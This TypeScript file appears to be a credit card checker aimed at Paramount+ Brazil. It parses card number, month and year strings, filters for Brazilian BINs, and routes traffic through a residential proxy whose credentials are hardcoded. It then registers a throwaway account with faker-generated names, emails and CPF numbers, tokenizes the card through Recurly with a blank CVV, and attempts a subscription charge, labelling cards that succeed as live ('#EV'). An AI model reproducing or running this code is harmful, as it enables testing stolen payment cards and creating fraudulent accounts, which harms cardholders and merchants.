import {CookieJar} from 'tough-cookie';
import axios from "axios";
import {fakerPT_BR as faker} from "@faker-js/faker";
import {createCookieAgent} from 'http-cookie-agent/http';
import httpsProxyAgent from 'https-proxy-agent';
import {generate as generateCpf} from 'gerador-validador-cpf'

const getStr = (str: any, start: any, end: any) => {
    return str?.split(start)[1]?.split(end)[0];
}

const GetBIN = async (info: string) => {
    const bin = info?.substring(0, 6);
    const {data} = await axios.get(`https://pay.hotmart.com/api/next/cardInfo/${bin}`)

    if (data?.data) {
        return {
            bandeira: data?.data?.cardType,
            banco: data?.data?.cardBank,
            pais: data?.data?.country
        };
    }

    return {
        bandeira: 'Nao encontrado',
        banco: 'Nao encontrado',
        pais: 'Nao encontrado',
    }
}


export const Paramount = async (info: string) => {
    try {

        const [cc, mes, ano] = info?.split('|')

        const jar = new CookieJar();

        const HttpsProxyCookieAgent = createCookieAgent(httpsProxyAgent.HttpsProxyAgent);

        const client = axios.create({
            httpsAgent: new HttpsProxyCookieAgent({
                cookies: {jar},
                hostname: '185.21.60.181',
                port: '14658',
                auth: '6419636-res-country-BR:2jjead685e'
            }),
        });

        const bin = await GetBIN(info);
        const binParsed = `Bandeira: ${bin.bandeira} Banco: ${bin.banco} Pais: ${bin.pais}`
        if (bin.pais !== 'BR') {
            return `${binParsed} - (Não pode testar info gringa é somente br)`
        }

        await client.get('https://www.paramountplus.com/br/', {
            headers: {
                'Host': 'www.paramountplus.com',
                'user-agent': faker.internet.userAgent(),
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            }
        })

        const {data: response_1} = await client.get('https://www.paramountplus.com/br/account/user-flow/f-upsell/', {
            headers: {
                'Host': 'www.paramountplus.com',
                'user-agent': faker.internet.userAgent(),
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'referer': 'https://www.paramountplus.com/br/',
                'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            }
        })

        const authToken = getStr(response_1, "CBS.Registry.login.authToken = '", "';")
        const productCode = getStr(response_1, '"package_code":"CBS_ALL_ACCESS_AD_FREE_PACKAGE","code":"', '","recurlyCode":"pplus_intl_br_mobileonly_monthly","')
        const recurly_public_key = getStr(response_1, 'CBS.Registry.recurly_public_key = "', '";')

        console.log({
            fullName: faker.person.fullName(),
            email: faker.internet.email(),
            password: 'pedro12A@',
            optIn: 'true',
            requiredAgreement: 'true',
            tk_trp: authToken
        })

        const {data: response_register} = await client.post('https://www.paramountplus.com/br/account/xhr/register/', {
            fullName: faker.person.fullName(),
            email: faker.internet.email(),
            password: 'pedro12A@',
            optIn: 'true',
            requiredAgreement: 'true',
            tk_trp: authToken
        }, {
            headers: {
                'Host': 'www.paramountplus.com',
                'user-agent': faker.internet.userAgent(),
                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryprUEzC8Zu2rM502T',
                'accept': 'application/json, text/plain, */*',
                'x-requested-with': 'XMLHttpRequest',
                'origin': 'https://www.paramountplus.com',
                'referer': 'https://www.paramountplus.com/br/account/signup/createaccount',
                'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            }
        })

        if (!response_register?.success) {
            return `${binParsed} - (${response_register?.message})`
        }

        const {data: response_2} = await client.get(`https://api.recurly.com/js/v1/risk/preflights?version=4.26.0&key=${recurly_public_key}&instanceId=aqyifJXKNGlkH7yY`, {
            headers: {
                'Host': 'api.recurly.com',
                'user-agent': faker.internet.userAgent(),
                'accept': '*/*',
                'referer': 'https://api.recurly.com/js/v1/field.html',
                'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            }
        })

        const gatewaysCode = response_2?.preflights?.map((gate: any) => {
            return gate?.params?.gateway_code
        })

        const {data: response_3} = await client.post('https://api.recurly.com/js/v1/token', {
            'first_name': faker.person.firstName('male'),
            'last_name': faker.person.lastName(),
            'address1': faker.location.street() + ' 441',
            'city': faker.location.city(),
            'state': 'SC',
            'postal_code': '89249000',
            'tax_identifier': generateCpf({format: true}),
            'tax_identifier_type': 'cpf',
            'country': 'BR',
            'token': '',
            'number': cc,
            'browser[color_depth]': '24',
            'browser[java_enabled]': 'false',
            'browser[language]': 'pt-BR',
            'browser[referrer_url]': 'https://www.paramountplus.com/br/account/signup/submitpayment',
            'browser[screen_height]': '864',
            'browser[screen_width]': '1536',
            'browser[time_zone_offset]': '180',
            'browser[user_agent]': faker.internet.userAgent(),
            'month': mes,
            'year': ano,
            'cvv': '',
            'risk[0][processor]': 'cybersource',
            'risk[0][gateway_code]': gatewaysCode[0],
            'risk[1][processor]': 'cybersource',
            'risk[1][gateway_code]': gatewaysCode[1],
            'risk[2][processor]': 'cybersource',
            'risk[2][gateway_code]': gatewaysCode[2],
            'risk[3][processor]': 'cybersource',
            'risk[3][gateway_code]': gatewaysCode[3],
            'risk[4][processor]': 'cybersource',
            'risk[4][gateway_code]': gatewaysCode[4],
            'risk[5][processor]': 'cybersource',
            'risk[5][gateway_code]': gatewaysCode[5],
            'version': '4.26.0',
            'key': recurly_public_key,
            'instanceId': 'aqyifJXKNGlkH7yY',
        })
        const credit_card = response_3?.id;

        const {data: response_4} = await client.post('https://www.paramountplus.com/br/account/xhr/processPayment/', {
            'token': credit_card,
            'm': '792409',
            'i': '0',
            'productType': 'monthly',
            'productCode': productCode,
            'tk_trp': authToken,
        }, {
            headers: {
                'Host': 'www.paramountplus.com',
                'user-agent': faker.internet.userAgent(),
                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarydRLyROJYSpgLtDMd',
                'accept': 'application/json, text/plain, */*',
                'x-requested-with': 'XMLHttpRequest',
                'origin': 'https://www.paramountplus.com',
                'referer': 'https://www.paramountplus.com/br/account/signup/submitpayment',
                'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            }
        })

        const jsonParsed = JSON.stringify(response_4)
        console.log(response_4)
        if (jsonParsed?.includes('SUBSCRIBER') || response_4?.success) {
            return `${binParsed} - #EV`;
        } else {
            return `${binParsed} - (${response_4?.code})`
        }
    } catch (e: any) {
        console.log(e?.message, e?.response?.data)

        return e?.message
    }
}